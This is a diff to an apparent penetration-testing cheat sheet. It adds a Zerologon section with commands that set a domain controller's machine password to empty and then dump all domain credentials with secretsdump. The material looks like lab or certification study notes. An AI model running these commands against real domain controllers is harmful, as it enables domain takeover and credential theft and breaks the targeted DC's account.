@@ -197,6 +197,19 @@ $ john --wordlist=rockyou.txt johncrackfile
 
 ## AD Lateral Movement
 
+Try Zerologon (requires reset after use as account pw is set to emtpy)
+* Source: https://github.com/risksense/zerologon
+* Affects ALL Windows Server versions, but we want to target DCs (high-value).
+```
+# set computer account password to an empty string.
+$ python3 set_empty_pw.py [dc_computername] [dc_ip]
+$ python3 set_empty_pw.py xor-dc01 10.11.1.120 
+
+# dump domain creds
+$ python secretsdump.py -hashes :[empty_password_hash] '[domain]/[dc_computername]$@[dc_ip]'
+$ python secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'xor/xor-dc01$@x.x.x.x'
+```
+
 Have plaintext credentials?
 ```
 # RDP clients
